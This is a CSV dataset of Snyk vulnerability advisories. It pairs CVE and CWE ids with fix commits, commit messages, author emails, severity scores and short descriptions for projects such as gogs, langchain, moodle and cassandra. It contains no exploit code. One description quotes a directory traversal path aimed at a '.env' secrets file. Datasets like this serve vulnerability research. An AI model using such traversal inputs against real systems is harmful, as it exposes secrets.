CVE-2018-20303,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GOGSIOGOGSPKGTOOL-5806426,26/07/2023,14/05/2022,https://github.com/gogs/gogs/commit/ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,Directory Traversal,https://api.github.com/repos/gogs/gogs/commits/ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,Unknwon,u@gogs.io,gogs,ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,pkg/tool: improve SanitizePath (#5558),Go,7.5,high,"gogs.io/gogs/pkg/tool is a self-hosted Git service.
Affected versions of this package are vulnerable to Directory Traversal due to improper path sanitization in the SanitizePath function. Exploiting this vulnerability is possible via the file-upload functionality which allows an attacker to create a file under data/sessions on the server.",2023
CVE-2018-20303,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOGSGOGSPKGTOOL-5806424,26/07/2023,14/05/2022,https://github.com/gogs/gogs/commit/ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,Directory Traversal,https://api.github.com/repos/gogs/gogs/commits/ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,Unknwon,u@gogs.io,gogs,ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,pkg/tool: improve SanitizePath (#5558),Go,7.5,high,"github.com/gogs/gogs/pkg/tool is a self-hosted Git service.
Affected versions of this package are vulnerable to Directory Traversal due to improper path sanitization in the SanitizePath function. Exploiting this vulnerability is possible via the file-upload functionality which allows an attacker to create a file under data/sessions on the server.",2023
CVE-2018-20303,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GOGSIOGOGSPKGTOOL-5806425,26/07/2023,14/05/2022,https://github.com/gogs/gogs/commit/ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,Directory Traversal,https://api.github.com/repos/gogs/gogs/commits/ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,Unknwon,u@gogs.io,gogs,ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,pkg/tool: improve SanitizePath (#5558),Go,7.5,high,"gogs.io/gogs/pkg/tool is a self-hosted Git service.
Affected versions of this package are vulnerable to Directory Traversal due to improper path sanitization in the SanitizePath function. Exploiting this vulnerability is possible via the file-upload functionality which allows an attacker to create a file under data/sessions on the server.",2023
CVE-2018-20303,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGOGSGOGSPKGTOOL-5806423,26/07/2023,14/05/2022,https://github.com/gogs/gogs/commit/ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,Directory Traversal,https://api.github.com/repos/gogs/gogs/commits/ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,Unknwon,u@gogs.io,gogs,ff93d9dbda5cebe90d86e4b7dfb2c6b8642970ce,pkg/tool: improve SanitizePath (#5558),Go,7.5,high,"github.com/gogs/gogs/pkg/tool is a self-hosted Git service.
Affected versions of this package are vulnerable to Directory Traversal due to improper path sanitization in the SanitizePath function. Exploiting this vulnerability is possible via the file-upload functionality which allows an attacker to create a file under data/sessions on the server.",2023
CVE-2017-7725,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-CONCRETE5CONCRETE5-5805426,26/07/2023,13/05/2022,https://github.com/concretecms/concretecms/commit/95687febb1dbba821939acb6b3eeefbda3e11a24,Cross-site Scripting (XSS),https://api.github.com/repos/concretecms/concretecms/commits/95687febb1dbba821939acb6b3eeefbda3e11a24,Korvin Szanto,korvinszanto@gmail.com,concretecms,95687febb1dbba821939acb6b3eeefbda3e11a24,"Use relative urls instead of the request url:


Former-commit-id: 040034a12a3e3b64ccbcb2e9bc3239b555de6589
Former-commit-id: 99b6326c6aef8fb47c2451252453909f9ad4b55f",PHP,6.1,medium,"concrete5/concrete5 is a concrete5 open source CMS.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) if the administrator did not define a ""canonical"" URL on installation of concrete5 using the ""Advanced Options"" settings. Remote attackers can send a GET request with any domain name in the Host header; this is stored and allows for arbitrary domains to be set for certain links displayed to subsequent visitors.",2023
CVE-2017-7531,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-5805412,26/07/2023,13/05/2022,https://github.com/moodle/moodle/commit/67103939ac414984821e9dc9a644b68bda2159cb,Information Exposure,https://api.github.com/repos/moodle/moodle/commits/67103939ac414984821e9dc9a644b68bda2159cb,Mark Nelson,markn@moodle.com,moodle,67103939ac414984821e9dc9a644b68bda2159cb,MDL-59304 core_calendar: check if course is hidden in bailout callback,PHP,4.3,medium,"moodle/moodle is a learning platform.
Affected versions of this package are vulnerable to Information Exposure such that the course overview block reveals activities in hidden courses.",2023
,CWE-284,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGFOLIO-5805411,26/07/2023,25/07/2023,https://github.com/folio-org/mod-remote-storage/commit/57df495f76e9aa5be9ce7ce3a65f89b6dbcbc13b,Access Restriction Bypass,https://api.github.com/repos/folio-org/mod-remote-storage/commits/57df495f76e9aa5be9ce7ce3a65f89b6dbcbc13b,julianladisch,julianladisch@users.noreply.github.com,mod-remote-storage,57df495f76e9aa5be9ce7ce3a65f89b6dbcbc13b,"Merge pull request from GHSA-m8v7-469p-5x89

MODRS-174: Hard-coded system user credentials",Markdown,5.3,medium,"Affected versions of this package are vulnerable to Access Restriction Bypass. The module creates a system user that is used to perform internal module-to-module operations.  Credentials for this user are hard-coded in the source code. This makes it trivial to authenticate as this user, allowing unauthorized read access to these mod-inventory-storage records: instances, holdings, items, contributor types, identifier-types. This includes records marked as suppressed from discovery.",2023
CVE-2018-5387,CWE-347,Snyk,https://security.snyk.io/vuln/SNYK-PHP-GOGENTOOSSSAMLBASE-5768545,09/07/2023,13/05/2022,https://github.com/GoGentoOSS/SAMLBase/commit/482cdf8c090e0f1179073034ebcb609ac7c3f5b3,Improper Verification of Cryptographic Signature,https://api.github.com/repos/GoGentoOSS/SAMLBase/commits/482cdf8c090e0f1179073034ebcb609ac7c3f5b3,Ron van der Molen,ron@wizkunde.nl,SAMLBase,482cdf8c090e0f1179073034ebcb609ac7c3f5b3,Fixed comment vulnerability in verifying signatures,PHP,7.5,high,Affected versions of this package are vulnerable to Improper Verification of Cryptographic Signature where Wizkunde SAMLBase can incorrectly utilize the results of the XML DOM traversal and canonicalization APIs in such a way that an attacker may be able to manipulate the SAML data without invalidating the cryptographic signature. This allows the attack to potentially bypass authentication to SAML service providers.,2023
CVE-2021-3291,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-PHP-ZENCARTZENCART-5768543,09/07/2023,24/05/2022,https://github.com/zencart/zencart/commit/7447627f7148b11c614f89dab4a09d3f102b58af,Arbitrary Code Execution,https://api.github.com/repos/zencart/zencart/commits/7447627f7148b11c614f89dab4a09d3f102b58af,Chris Brown,drbyte@zen-cart.com,zencart,7447627f7148b11c614f89dab4a09d3f102b58af,"Fix CVE-2021-3291

Note: origin issue not exploitable without knowing the admin directory name and being fully logged in as a valid administrator.",PHP,7.2,high,"zencart/zencart is an Open Source E-commerce Application
Affected versions of this package are vulnerable to Arbitrary Code Execution which allows admins to execute arbitrary OS commands by inspecting an HTML radio input element (within the modules edit page) and inserting a command.",2023
CVE-2017-7251,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIPI-5768538,09/07/2023,13/05/2022,https://github.com/pi-engine/pi/commit/557cd05b21b4d7fe422f90adcfa0c6e3bea06153,Cross-site Scripting (XSS),https://api.github.com/repos/pi-engine/pi/commits/557cd05b21b4d7fe422f90adcfa0c6e3bea06153,voltan,djvoltan@gmail.com,pi,557cd05b21b4d7fe422f90adcfa0c6e3bea06153,Fix XSS problem https://github.com/pi-engine/pi/issues/1523,PHP,6.1,medium,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to insufficient filtration of user-supplied data (preview) passed to the pi-develop/www/script/editor/markitup/preview/markdown.php URL.,2023
CVE-2023-37269,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-WINTERCMSWINTER-5768536,09/07/2023,08/07/2023,https://github.com/wintercms/storm/commit/186d85d8fea2cae43afc807d39f68553c24e56be,Cross-site Scripting (XSS),https://api.github.com/repos/wintercms/storm/commits/186d85d8fea2cae43afc807d39f68553c24e56be,Luke Towers,git@luketowers.ca,storm,186d85d8fea2cae43afc807d39f68553c24e56be,Add support for uploading SVGs,PHP,2.0,low,Affected versions of this package are vulnerable to Cross-site Scripting (XSS) where users with the backend.manage_branding permission can upload SVGs as the application logo which are not sanitized.,2023
CVE-2023-2974,CWE-757,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IOQUARKUS-5768473,09/07/2023,29/06/2023,https://github.com/quarkusio/quarkus/commit/2f856a15be582e8763394f36c81bafc56a87fcc8,Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade'),https://api.github.com/repos/quarkusio/quarkus/commits/2f856a15be582e8763394f36c81bafc56a87fcc8,Guillaume Smet,guillaume.smet@gmail.com,quarkus,2f856a15be582e8763394f36c81bafc56a87fcc8,"Merge pull request #34469 from cescoffier/2.16-cve-2023-2974

2.16 - Enforce the configured TLS version",Java,6.5,medium,"io.quarkus:quarkus-vertx-http is a Cloud Native, (Linux) Container First framework for writing Java applications.
Affected versions of this package are vulnerable to Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade') such that the TLS protocol configured with quarkus.http.ssl.protocols is not enforced, and the client can force the selection of the weaker supported TLS protocol.",2023
CVE-2023-2974,CWE-757,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IOQUARKUS-5768474,09/07/2023,29/06/2023,https://github.com/quarkusio/quarkus/commit/2f856a15be582e8763394f36c81bafc56a87fcc8,Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade'),https://api.github.com/repos/quarkusio/quarkus/commits/2f856a15be582e8763394f36c81bafc56a87fcc8,Guillaume Smet,guillaume.smet@gmail.com,quarkus,2f856a15be582e8763394f36c81bafc56a87fcc8,"Merge pull request #34469 from cescoffier/2.16-cve-2023-2974

2.16 - Enforce the configured TLS version",Java,6.5,medium,"io.quarkus:quarkus-grpc is a Cloud Native, (Linux) Container First framework for writing Java applications.
Affected versions of this package are vulnerable to Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade') such that the TLS protocol configured with quarkus.http.ssl.protocols is not enforced, and the client can force the selection of the weaker supported TLS protocol.",2023
CVE-2023-36258,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-LANGCHAIN-5752409,09/07/2023,04/07/2023,https://github.com/langchain-ai/langchain/commit/e294ba475a355feb95003ed8f1a2b99942509a9e,Arbitrary Code Injection,https://api.github.com/repos/langchain-ai/langchain/commits/e294ba475a355feb95003ed8f1a2b99942509a9e,William FH,13333726+hinthornw@users.noreply.github.com,langchain,e294ba475a355feb95003ed8f1a2b99942509a9e,"Some mitigations for RCE in PAL chain (#7870)

Some docstring / small nits to #6003

---------

Co-authored-by: BoazWasserman <49598618+boazwasserman@users.noreply.github.com>
Co-authored-by: HippoTerrific <49598618+HippoTerrific@users.noreply.github.com>
Co-authored-by: Or Raz <orraz1994@gmail.com>",Python,9.8,critical,"langchain is a Building applications with LLMs through composability
Affected versions of this package are vulnerable to Arbitrary Code Injection via PALChain, using the from_math_prompt() function or others, which can invoke exec.",2023
,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-AGIXT-5759323,07/07/2023,07/07/2023,https://github.com/Josh-XT/AGiXT/commit/003abf39a275c1720c7c25bc04fbdd22d2cc4803,Directory Traversal,https://api.github.com/repos/Josh-XT/AGiXT/commits/003abf39a275c1720c7c25bc04fbdd22d2cc4803,Josh XT,102809327+Josh-XT@users.noreply.github.com,AGiXT,003abf39a275c1720c7c25bc04fbdd22d2cc4803,"Security updates (#673)

* Security update

* Prompts security updates

* Read files to memory to WORKSPACE folder

* Chain and Interactions security updates

* Security updates for Agent.py

* Fix typo

* Security updates, bug fixes, tests",Python,7.5,high,"agixt is an An Artificial Intelligence Automation Platform. AI Instruction management from various providers, has an adaptive memory, and a versatile plugin system with many commands including web browsing. Supports many AI providers and models and growing support every day.
Affected versions of this package are vulnerable to Directory Traversal due to improper user-input sanitization.",2023
,CWE-20,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-DASHAGGRID-5759321,07/07/2023,07/07/2023,https://github.com/plotly/dash-ag-grid/commit/b888d6ab4fcb4afac187492e8b6c9cf0d0f8842b,Improper Input Validation,https://api.github.com/repos/plotly/dash-ag-grid/commits/b888d6ab4fcb4afac187492e8b6c9cf0d0f8842b,BSd3v,bryan.ri.schroeder@gmail.com,dash-ag-grid,b888d6ab4fcb4afac187492e8b6c9cf0d0f8842b,"Major overhaul of dash-ag-grid:
- bringing ag-grid from version v27.x to v29.x+
- added secondary `agGridEnterprise.react.js` as additional importing `ag-grid-enterprise` due to all-modules no longer supported
- updating props for breaking changes due to version update
- adding props for easier user / dash manipulation (enable... props ) for creating buttons
- removing `agGridColumns` due to deprecation and removal due to v29
- added `className` support for css customization native to ag-grid (removed hardcoded styling as well)
- added overarching `dangerously_allow_html` to grid props only provided at render, to keep `columnDefs` from receiving possible updates to show unsafe html
- added `data_previous` and `data_previous_timestamp` to allow for use with user change logs
- added `dashGridOptions` to allow for arbitrary use of props not explicitly listed
- added `setRowId` for allowing `rowData` change detection to work
- added prop `columnState` to allow for pulling the current state of the columns after user interaction, necessary for saving layouts outside of snapshots
- fixed issue where conditional formatting was not applied to nested columns
- fixed issue where columns would not take edits or adjustments due to becoming static
- updated `markdownRenderer.js` to use github markdown, and also have the ability to be passed a target for links, to avoid `dangerously_allow_html`
- updated `requirements.txt` to pull the latest packages",Python,8.6,high,"dash-ag-grid is a Dash wrapper around AG Grid, the best interactive data grid for the web.
Affected versions of this package are vulnerable to Improper Input Validation due to not preventing 'columnDefs' from showing unsafe HTML.",2023
,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-CGROUPSEXPORTER-5759322,07/07/2023,07/07/2023,https://github.com/mosquito/cgroups-exporter/commit/611ac2618e834135a86b1871231680759e4c37ff,Denial of Service (DoS),https://api.github.com/repos/mosquito/cgroups-exporter/commits/611ac2618e834135a86b1871231680759e4c37ff,Mosquito,me@mosquito.su,cgroups-exporter,611ac2618e834135a86b1871231680759e4c37ff,"Merge pull request #7 from mosquito/hotfix/slow-tcp-attack-fix

Use lock just for make a copy",Python,7.5,high,"cgroups-exporter is a prometheus exporter for cgroups v1
Affected versions of this package are vulnerable to Denial of Service (DoS) due to insufficient checks in the cgroups_exporter/metrics/_metrics.py file.",2023
,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-CRYTICCOMPILE-5759320,07/07/2023,07/07/2023,https://github.com/crytic/crytic-compile/commit/a6ade57ada924e38703504dd9dce3d00fae173ec,Directory Traversal,https://api.github.com/repos/crytic/crytic-compile/commits/a6ade57ada924e38703504dd9dce3d00fae173ec,Feist Josselin,josselin@trailofbits.com,crytic-compile,a6ade57ada924e38703504dd9dce3d00fae173ec,"Merge pull request #425 from crytic/fix-path-traversal

prevent possible path traversal for etherscan platform",Config files,7.5,high,"crytic-compile is an Util to facilitate smart contracts compilation.
Affected versions of this package are vulnerable to Directory Traversal. If a user runs crytic-compile on an address with malicious artifacts verified on etherscan, it is possible to write files on the user's machine by using a relative path e.g. ../../../../.env to traverse above the export directory (crytic-export/ ).",2023
,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-DETERMINED-5759319,07/07/2023,07/07/2023,https://github.com/determined-ai/determined/commit/5600fe88a5a1faaa9fb111c59b83b14a2b1ade1b,Information Exposure,https://api.github.com/repos/determined-ai/determined/commits/5600fe88a5a1faaa9fb111c59b83b14a2b1ade1b,Sean Mackrory,sean.mackrory@hpe.com,determined,5600fe88a5a1faaa9fb111c59b83b14a2b1ade1b,"chore: allow tokens to be provided via secure cookie instead (#6862)

Co-authored-by: Bill Boggs <william.boggs@hpe.com>",Unknown,5.3,medium,"determined is a Determined Deep Learning Training Platform
Affected versions of this package are vulnerable to Information Exposure due to using JWT tokens over URLs which can lead to session hijacking.",2023
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-DJANGOFILER-5759318,07/07/2023,07/07/2023,https://github.com/django-cms/django-filer/commit/d66a09f68f690b73c0e6011c56bde9852d298440,Cross-site Scripting (XSS),https://api.github.com/repos/django-cms/django-filer/commits/d66a09f68f690b73c0e6011c56bde9852d298440,Fabian Braun,fsbraun@gmx.de,django-filer,d66a09f68f690b73c0e6011c56bde9852d298440,"feat: Introduce upload validation to prevent XSS exploits with SVG (#1364)

* Add download property to `a` tags

* Validate file content by mime type

* Add noreferrer and noopener to links

* Update docs, changelog

* Fix isort

* Improve heuristics for SVG

* Update error message

* add base64 obfuscation

* fix case obfuscation

* Update docs

* Update docs

* Update comment

* Add test for html and svg attack

* Mark untestable settings.py

* Mark untestable settings.py

* Improve tests

* Comments and readability improvements

* improve tests

* Update docs/validation.rst

Co-authored-by: Mark Walker <theshow@gmail.com>

* Update docs/validation.rst

Co-authored-by: Mark Walker <theshow@gmail.com>

* Update trans -> translate

* Introduce mime type white list, improved error message on incorrect config.

* WHITE_LIST -> WHITELIST

* Tests for whitelist

* Docs update

* Improved docs

* Experimental svg santization

* replace try except by if

* Update docs

* doc typos fixed

---------

Co-authored-by: Mark Walker <theshow@gmail.com>",Unknown,6.1,medium,"django-filer is an A file management application for django that makes handling of files and images a breeze.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization when using using HTML or SVG files.",2023
,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-DJANGOWEBIX-5759317,07/07/2023,07/07/2023,https://github.com/MPASolutions/django-webix/commit/4190a0934e8389d6f73687331d6814ad9fdec358,Cross-site Request Forgery (CSRF),https://api.github.com/repos/MPASolutions/django-webix/commits/4190a0934e8389d6f73687331d6814ad9fdec358,Alessandro Regolini,regolini@mpasol.it,django-webix,4190a0934e8389d6f73687331d6814ad9fdec358,fix function before senzd expecially for csrf,JavaScript,4.3,medium,Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) due to improper implementation of the beforeSend function.,2023
,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-DRFSPECTACULAR-5759315,07/07/2023,07/07/2023,https://github.com/tfranzel/drf-spectacular/commit/7e77bb3ea852f407f1780c8ae6b5b17a9c8b8520,Directory Traversal,https://api.github.com/repos/tfranzel/drf-spectacular/commits/7e77bb3ea852f407f1780c8ae6b5b17a9c8b8520,T. Franzel,13507857+tfranzel@users.noreply.github.com,drf-spectacular,7e77bb3ea852f407f1780c8ae6b5b17a9c8b8520,bugfix model path traversal via intermediate property,Python,7.5,high,"drf-spectacular is a Sane and flexible OpenAPI 3 schema generation for Django REST framework
Affected versions of this package are vulnerable to Directory Traversal due to improper user-input sanitization in the drf_spectacular/plumbing.py file.",2023
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-DJANGORQSCHEDULER-5759316,07/07/2023,07/07/2023,https://github.com/dsoftwareinc/django-rq-scheduler/commit/51a47230babc583ebd8230c40bc264af215d404e,Cross-site Scripting (XSS),https://api.github.com/repos/dsoftwareinc/django-rq-scheduler/commits/51a47230babc583ebd8230c40bc264af215d404e,Daniel M,daniel.maruani@gmail.com,django-rq-scheduler,51a47230babc583ebd8230c40bc264af215d404e,Fix security issues,Python,6.1,medium,"django-rq-scheduler is an An async job scheduler for django using redis
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization in the scheduler/views.py file.",2023
,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-GNS3SERVER-5759314,07/07/2023,07/07/2023,https://github.com/GNS3/gns3-server/commit/3a479d7ea6d0a5af79025fb494763c03eacec001,Directory Traversal,https://api.github.com/repos/GNS3/gns3-server/commits/3a479d7ea6d0a5af79025fb494763c03eacec001,Jeremy Grossmann,grossmj@gns3.net,gns3-server,3a479d7ea6d0a5af79025fb494763c03eacec001,"Merge pull request #1900 from GNS3/prevent-directory-traversal

Prevent directory traversal",Python,7.5,high,"gns3-server is a GNS3 server
Affected versions of this package are vulnerable to Directory Traversal due to improper user-input sanitization allowing an attacker to read all files on the remote server.",2023
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-INDICO-5759313,07/07/2023,07/07/2023,https://github.com/indico/indico/commit/ff5d7e2234739963a84c48e76b32a5220f6455e1,Cross-site Scripting (XSS),https://api.github.com/repos/indico/indico/commits/ff5d7e2234739963a84c48e76b32a5220f6455e1,Tomas R,tomas.roun@cern.ch,indico,ff5d7e2234739963a84c48e76b32a5220f6455e1,Upgrade to MathJax v3 (#5818),Unknown,6.1,medium,"indico is a conference lifecycle management and meeting/lecture scheduling tool.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to improper user-input sanitization when using \href{}.",2023
,CWE-275,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-JUPYTERHUBSYSTEMDSPAWNER-5759312,07/07/2023,07/07/2023,https://github.com/jupyterhub/systemdspawner/commit/e9fcd22af058ad0df02ff8324af2db249be38e4d,Insecure Permissions,https://api.github.com/repos/jupyterhub/systemdspawner/commits/e9fcd22af058ad0df02ff8324af2db249be38e4d,YuviPanda,yuvipanda@gmail.com,systemdspawner,e9fcd22af058ad0df02ff8324af2db249be38e4d,"Disable user sudo by default

Protects against vulnerabilities such as
https://arstechnica.com/information-technology/2022/01/a-bug-lurking-for-12-years-gives-attackers-root-on-every-major-linux-distro/
or the previous sudo vulnerability.

Equivalent of https://github.com/jupyterhub/kubespawner/pull/545

This should be counted as a braking change.",Python,5.3,medium,"jupyterhub-systemdspawner is a JupyterHub Spawner using systemd for resource isolation
Affected versions of this package are vulnerable to Insecure Permissions due to not disabling user sudo by default.",2023
,CWE-1333,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-JSONARGPARSE-5759311,07/07/2023,07/07/2023,https://github.com/omni-us/jsonargparse/commit/7f5e9b808130de4e60093b5a9fde264f69d74e93,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/omni-us/jsonargparse/commits/7f5e9b808130de4e60093b5a9fde264f69d74e93,Mauricio Villegas,5780272+mauvilsa@users.noreply.github.com,jsonargparse,7f5e9b808130de4e60093b5a9fde264f69d74e93,Fix regular expressions vulnerable to polynomial runtime due to backtracking.,Unknown,5.3,medium,"jsonargparse is an Implement minimal boilerplate CLIs derived from type hints and parse from command line, config files and environment variables.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to using an inefficient pattern.",2023
,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-KAGI-5759307,07/07/2023,07/07/2023,https://github.com/justinmayer/kagi/commit/e2b7d7b414e2061efc32be8d77a32198e138fa5c,Information Exposure,https://api.github.com/repos/justinmayer/kagi/commits/e2b7d7b414e2061efc32be8d77a32198e138fa5c,Markus Holtermann,info@markusholtermann.eu,kagi,e2b7d7b414e2061efc32be8d77a32198e138fa5c,"feat: Prevent secret submission from the client when adding TOTP devices (#72)

Previously, a client could submit the secret for a TOTP device when
adding it, through a hidden `base32_key` form field. With this commit,
the secret is kept in a user session to remove a client's control over
the secret.",Python,5.3,medium,"kagi is a Django app for WebAuthn and TOTP-based multi-factor authentication
Affected versions of this package are vulnerable to Information Exposure such that a client could submit the secret for a TOTP device when adding it, through a hidden base32_key form field.",2023
CVE-2018-8947,CWE-312,Snyk,https://security.snyk.io/vuln/SNYK-PHP-RAP2HPOUTRELARAVELLOGVIEWER-5759272,07/07/2023,13/05/2022,https://github.com/rap2hpoutre/laravel-log-viewer/commit/cda89c06dc5331d06fab863d7cb1c4047ad68357,Cleartext Storage of Sensitive Information,https://api.github.com/repos/rap2hpoutre/laravel-log-viewer/commits/cda89c06dc5331d06fab863d7cb1c4047ad68357,rap2h,raphaelht@gmail.com,laravel-log-viewer,cda89c06dc5331d06fab863d7cb1c4047ad68357,security fix,PHP,7.5,high,"Affected versions of this package are vulnerable to Cleartext Storage of Sensitive Information due to relying on Base64 encoding for l, dl, and del requests, which makes it easier for remote attackers to bypass intended access restrictions.",2023
CVE-2023-36823,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-RUBY-SANITIZE-5759269,07/07/2023,07/07/2023,https://github.com/rgrove/sanitize/commit/76ed46e6dc70820f38efe27de8dabd54dddb5220,Cross-site Scripting (XSS),https://api.github.com/repos/rgrove/sanitize/commits/76ed46e6dc70820f38efe27de8dabd54dddb5220,Ryan Grove,ryan@wonko.com,sanitize,76ed46e6dc70820f38efe27de8dabd54dddb5220,"Merge pull request from GHSA-f5ww-cq3m-q3g7

Escape `</` to prevent a style element from being closed prematurely",Markdown,7.1,high,"sanitize is a Ruby HTML and CSS sanitizer.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) due to insufficient neutralization of style element content. Using carefully crafted input, an attacker may be able to sneak arbitrary HTML and CSS when the library is configured to use the built-in ""relaxed"" config or when using a custom config that allows style elements and one or more CSS at-rules.",2023
CVE-2023-29824,CWE-416,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-SCIPY-5759266,07/07/2023,07/07/2023,https://github.com/scipy/scipy/commit/e32fc2329d3dd23298725153c5b2cc7fcd0f14f1,Use After Free,https://api.github.com/repos/scipy/scipy/commits/e32fc2329d3dd23298725153c5b2cc7fcd0f14f1,Anirudh Dagar,anirudhdagar6@gmail.com,scipy,e32fc2329d3dd23298725153c5b2cc7fcd0f14f1,MAINT: Fix use-after-free in Py_FindObjects (#15013),C/C++,7.3,high,"Affected versions of this package are vulnerable to Use After Free via the Py_FindObjects() function.
Note:
According to the maintainer, this issue is not to be considered a vulnerability.",2023
CVE-2023-30601,CWE-264,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGAPACHECASSANDRA-5759267,07/07/2023,07/07/2023,https://github.com/apache/cassandra/commit/aafb4d19448f12ce600dc4e84a5b181308825b32,Privilege Escalation,https://api.github.com/repos/apache/cassandra/commits/aafb4d19448f12ce600dc4e84a5b181308825b32,Marcus Eriksson,marcuse@apache.org,cassandra,aafb4d19448f12ce600dc4e84a5b181308825b32,"Improve nodetool enable{audit,fullquery}log

Patch by marcuse; reviewed by Dinesh Joshi and Mick Semb Wever for CASSANDRA-18550",Unknown,7.8,high,"org.apache.cassandra:cassandra-all is a maven plugin for the Apache Cassandra Project. Which, develops a highly scalable second-generation distributed database, bringing together Dynamo's fully distributed design and Bigtable's ColumnFamily-based data model.
Affected versions of this package are vulnerable to Privilege Escalation when enabling FQL/Audit logs., allowing a user with JMX access to run arbitrary commands as the user running Apache Cassandra
This issue affects Apache Cassandra: from 4.0.0 through 4.0.9, from 4.1.0 through 4.1.1.",2023
CVE-2023-36188,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-LANGCHAIN-5759265,07/07/2023,06/07/2023,https://github.com/langchain-ai/langchain/commit/e294ba475a355feb95003ed8f1a2b99942509a9e,Arbitrary Code Execution,https://api.github.com/repos/langchain-ai/langchain/commits/e294ba475a355feb95003ed8f1a2b99942509a9e,William FH,13333726+hinthornw@users.noreply.github.com,langchain,e294ba475a355feb95003ed8f1a2b99942509a9e,"Some mitigations for RCE in PAL chain (#7870)

Some docstring / small nits to #6003

---------

Co-authored-by: BoazWasserman <49598618+boazwasserman@users.noreply.github.com>
Co-authored-by: HippoTerrific <49598618+HippoTerrific@users.noreply.github.com>
Co-authored-by: Or Raz <orraz1994@gmail.com>",Python,9.8,critical,"langchain is a Building applications with LLMs through composability
Affected versions of this package are vulnerable to Arbitrary Code Execution due to insufficient checks, via the PALChain parameter in the Python exec method.",2023
CVE-2023-3523,CWE-125,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-GPACGPAC-5757396,06/07/2023,06/07/2023,https://github.com/gpac/gpac/commit/64201a26476c12a7dbd7ffb5757743af6954db96,Out-of-bounds Read,https://api.github.com/repos/gpac/gpac/commits/64201a26476c12a7dbd7ffb5757743af6954db96,jeanlf,jeanlf@gpac.io,gpac,64201a26476c12a7dbd7ffb5757743af6954db96,fixed #2520,C/C++,6.1,medium,Affected versions of this package are vulnerable to Out-of-bounds Read due to insufficient checks in the vobsub_read_idx method.,2023
CVE-2023-27390,CWE-122,Snyk,https://security.snyk.io/vuln/SNYK-UNMANAGED-ARTHURSONZOGNIDIAGON-5756521,06/07/2023,06/07/2023,https://github.com/ArthurSonzogni/Diagon/commit/01ac8690d540f2b5c965ab173fdfced3da97fdf7,Heap-based Buffer Overflow,https://api.github.com/repos/ArthurSonzogni/Diagon/commits/01ac8690d540f2b5c965ab173fdfced3da97fdf7,ArthurSonzogni,sonzogniarthur@gmail.com,Diagon,01ac8690d540f2b5c965ab173fdfced3da97fdf7,"Fix CVE-2023-27390

""Self"" message are not supported, but this was not checked. This
triggered the error ""Something is wrong"", and then caused a buffer
overflow.

Bug:https://github.com/ArthurSonzogni/Diagon/issues/65",Unknown,8.4,high,Affected versions of this package are vulnerable to Heap-based Buffer Overflow. A heap-based buffer overflow vulnerability exists in the Sequence::DrawText. A specially crafted network request can lead to a heap buffer overflow. An attacker can send a network request to trigger this vulnerability.,2023
